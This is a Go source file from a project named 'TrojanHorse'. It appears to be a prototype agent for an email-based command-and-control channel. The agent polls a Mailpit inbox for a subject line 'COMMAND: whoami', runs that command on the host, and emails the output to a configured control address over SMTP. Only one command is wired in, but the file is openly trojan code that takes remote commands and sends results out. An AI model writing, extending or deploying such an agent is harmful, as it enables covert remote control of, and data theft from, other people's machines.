package main

import (
	"TrojanHorse/email"
	"fmt"
	"os/exec"

	"github.com/spf13/viper"
)

func agentmain() {
	// 读取配置文件
	viper.SetConfigFile("../config/config.yaml")
	err := viper.ReadInConfig()
	if err != nil {
		panic(fmt.Errorf("无法读取配置文件: %s", err))
	}

	// 初始化Mailpit客户端
	mailpit := email.NewMailpitClient("http://localhost:8025")

	// 获取最新邮件的主题
	subject, err := mailpit.FetchLatestSubject()
	if err != nil {
		panic(fmt.Errorf("获取邮件失败: %s", err))
	}

	if subject == "COMMAND: whoami" {
		// 执行命令
		out, err := exec.Command("whoami").Output()
		if err != nil {
			panic(fmt.Errorf("执行命令失败: %s", err))
		}

		// 初始化SMTP客户端
		smtpClient := email.NewSMTPClient(
			viper.GetString("smtp.host"),
			viper.GetString("smtp.port"),
			viper.GetString("smtp.username"),
			viper.GetString("smtp.password"),
		)

		// 发送回显邮件
		err = smtpClient.SendEmail(
			viper.GetString("control_email"),
			"RESULT: whoami",
			string(out),
			nil,
		)
		if err != nil {
			panic(fmt.Errorf("发送回显邮件失败: %s", err))
		}

		fmt.Println("命令已执行并返回结果")
	}

}
